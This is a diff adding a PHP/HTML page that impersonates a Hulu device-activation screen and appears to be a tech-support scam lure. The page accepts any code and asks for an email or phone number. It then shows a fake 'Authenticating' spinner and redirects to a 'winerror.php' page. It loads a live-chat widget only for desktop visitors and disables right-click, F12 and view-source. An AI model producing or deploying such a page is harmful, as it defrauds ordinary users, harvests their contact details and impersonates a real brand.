@@ -1,0 +1,372 @@
+<?php
+// Check if the user is on a Mac or Windows desktop
+function isDesktopOS() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    $desktopOSKeywords = array('Windows', 'Macintosh');
+
+    foreach ($desktopOSKeywords as $keyword) {
+        if (stripos($userAgent, $keyword) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+// Load the Tawk.to chat script if the user is on a desktop
+if (isDesktopOS()) {
+    echo '<script type="text/javascript">
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src="https://embed.tawk.to/654939d3a84dd54dc4891364/1hej0jpjv";
+            s1.charset="UTF-8";
+            s1.setAttribute("crossorigin","*");
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+    </script>';
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="shortcut icon" href="favicon.ico.png" type="image/vnd.microsoft.icon"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Activate Your Device</title>
+<script>
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://drivers.ink/matomo/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '91']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+
+  <style>
+    /* Reset default margin and padding for body */
+    body {
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Center the content both vertically and horizontally */
+    body {
+      font-family: 'Lato', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: white; /* Change the background color to your desired color */
+    }
+
+    /* Add styling for the logo image */
+    .logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      max-width: 100px;
+      height: auto;
+    }
+
+    .container-wrapper:focus-within .container {
+      box-shadow: 0 0 10px #28a745; /* Apply shadow when the input is focused */
+      outline: 2px solid #28a745; /* Change the outline (border) when the input is focused */
+    }
+
+    .container {
+        background-color: #FBFBFB;
+      width: 400px;
+      padding: 15px 15px 35px;
+      text-align: center;
+      border-radius: 6px; /* Add rounded corners to the container */
+      position: relative;
+      transition: box-shadow 0.3s, outline 0.3s; /* Add smooth transitions for box-shadow and outline */
+      border: 1px solid #ccc; /* Add a default border */
+    }
+
+    h1 {
+      font-size: 24px;
+      color: #4C4E52;
+      font-weight: 400;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 13px; /* Set the font size of <p> content to 10px */
+      color: #4C4E52;
+    }
+     a {
+      font-size: 13px; /* Set the font size of <p> content to 10px */
+      color: #4C4E52;
+    }
+
+    input[type="text"] {
+      width: 185px; /* Set the text box width to 100px */
+      padding: 10px;
+      margin-bottom: 10px;
+      border-radius: 2px; /* Add rounded corners to the text box */
+      font-size: 20px; /* Set the font size of input content to 20px */
+      transition: box-shadow 0.3s, outline 0.3s; /* Add smooth transitions for box-shadow and outline */
+      border: 1px solid #ccc; /* Add a default border */
+    }
+
+    input[type="text"]:focus {
+      box-shadow: 0 0 10px #28a745; /* Apply shadow when the input is focused */
+      outline: 2px solid #28a745; /* Change the outline (border) when the input is focused */
+    }
+
+    .error {
+      border: 2px solid red;
+    }
+
+    button {
+      padding: 12px 75px;
+      background-color: #28a745; /* Change the button color to your desired color */
+      color: white;
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+      border-radius: 2px; /* Add rounded corners to the button */
+    }
+    
+    .popup {
+            display: none;
+            animation: fadeIn 1.0s;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 50px;
+            background: #fff;
+            box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            z-index: 999;
+            border-radius: 10px;
+            font-family: 'Roboto', sans-serif; /* Use the Roboto font */
+        }
+
+
+
+  .close-icon {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    max-width:30px;
+    cursor: pointer;
+  }
+  
+  
+   .pop2 {
+            display: none;
+            animation: fadeIn 1.0s;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 50px 50px 220px;
+            background: #fff;
+            box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            z-index: 999;
+            border-radius: 10px;
+            font-family: 'Roboto', sans-serif; /* Use the Roboto font */
+   }
+        /* Styles for the overlay background */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 998;
+        }
+
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+  
+  
+.spinner {
+  border: 10px solid rgba(255, 255, 255, 0.3);
+  border-top: 10px solid #3498db;
+  border-radius: 50%;
+  width: 100px;
+  height: 100px;
+  animation: spin 2s linear infinite;
+  position: absolute;
+  top: 35%;
+  left: 20%;
+  margin-top: 25px;
+  margin-left: 25px; */
+}
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+
+  </style>
+<script>
+  // Disable right-click context menu
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+  });
+
+  // Detect F12 key press
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'F12' || e.keyCode === 123) {
+      e.preventDefault();
+      alert("F12 key is disabled on this page.");
+    }
+  });
+
+  // Detect Ctrl+U key combination
+  document.addEventListener('keydown', function (e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'u') {
+      e.preventDefault();
+      alert("Ctrl+U is disabled on this page.");
+    }
+  });
+</script>
+
+
+
+
+</head>
+<body>
+  <!-- Add the logo image in the top left corner -->
+  <img class="logo" src="black.svg" alt="Logo">
+
+  <div class="container-wrapper">
+    <div class="container">
+      <h1>Activate Your Device</h1>
+      <p>To activate your device, please enter the activation code.</p>
+
+      <input type="text" id="activationCode" placeholder="6K47J3" required>
+      <br>
+
+      <div id="errorText" style="color: red; display: none;">Please enter the correct Code</div>
+      <button id="activateButton" onclick="validateActivationCode()">Activate</button>
+
+      <br><br><a href="#">Manage Your Devices</a>
+    </div>
+  
+
+  <script>
+    function validateActivationCode() {
+      var activationCode = document.getElementById('activationCode').value;
+      var errorText = document.getElementById('errorText');
+
+      if (/^[A-Za-z0-9]{5,8}$/.test(activationCode)) {
+        document.getElementById('activationCode').classList.remove('error');
+        errorText.style.display = 'none';
+        document.getElementById("popup").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      } else {
+        document.getElementById('activationCode').classList.add('error');
+        errorText.style.display = 'block';
+      }
+    }
+
+    // Move the hidePopup function outside of validateActivationCode
+    function hidePopup() {
+      document.getElementById("popup").style.display = "none";
+      document.getElementById("overlay").style.display = "none";
+    }
+  </script>
+
+  <!-- Popup container -->
+  <div id="popup" class="popup">
+    <!-- Add a close icon to the right top corner of the popup -->
+    <img class="close-icon" src="close.png" alt="Close" onclick="hidePopup()">
+    <img src="black.svg" alt="Email or Phone" width="60" >
+    <h2>Email or Phone</h2>
+    <p>Please enter Your Email or Phone Number to Continue</p>
+    <input type="text" name="email" autocomplete="on" placeholder="" id="inputField">
+    <br><br>
+   <button id="continueButton" onclick="validateAndRedirect()">Continue</button>
+
+<script>
+  function validateAndRedirect() {
+    var inputField = document.getElementById('inputField');
+    var inputValue = inputField.value;
+
+    if (inputValue === '') {
+      // Input is blank, show an error message
+      alert("Enter Correct Email or Phone");
+    } else if (isPhoneNumber(inputValue) || isEmail(inputValue)) {
+      // Input is either a valid phone number or an email, proceed with redirection
+      // Hide the div with class 'popup'
+      var popupDiv = document.querySelector('.popup');
+      if (popupDiv) {
+        popupDiv.style.display = 'none';
+      }
+
+      // Show the div with class 'pop2'
+      var pop2Div = document.querySelector('.pop2');
+      if (pop2Div) {
+        pop2Div.style.display = 'block';
+
+        // Set a timer to redirect after 5 seconds
+        setTimeout(function() {
+          window.location.href = 'winerror.php';
+        }, 5000);
+      }
+    } else {
+      // Input is neither a valid phone number nor an email, show an error message
+      alert("Enter Correct Details");
+    }
+  }
+
+  function isPhoneNumber(value) {
+    // Check if the value is a valid phone number with optional symbols
+    return /^[\d+() -]{9,13}$/.test(value);
+  }
+
+  function isEmail(value) {
+    // Check if the value is in a valid email format
+    var emailPattern = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
+    return emailPattern.test(value);
+  }
+</script> </div>
+<center>
+
+<div id="pop2" class="pop2">
+     <h1>Authenticating...</h1><br>
+  
+    <div class="spinner"></div>
+
+
+</center>
+  <!-- Overlay background -->
+  <div id="overlay" class="overlay"></div>
+  
+  <br><center>
+ 
+      <div class="footer__container">
+        
+        <div class="footer__desc">
+          <a href="#">Legal Policies & Privacy</a> •
+          <a href="#">Contact us</a> •
+          <a href="#">Hulu</a>
+        </div>
+        <p class="footer__copyright">Copyright &copy; 2023 Hulu Ltd. All rights reserved.</p>
+      </div>
+   </div></center>
+</body>
+
+
+
+</html>
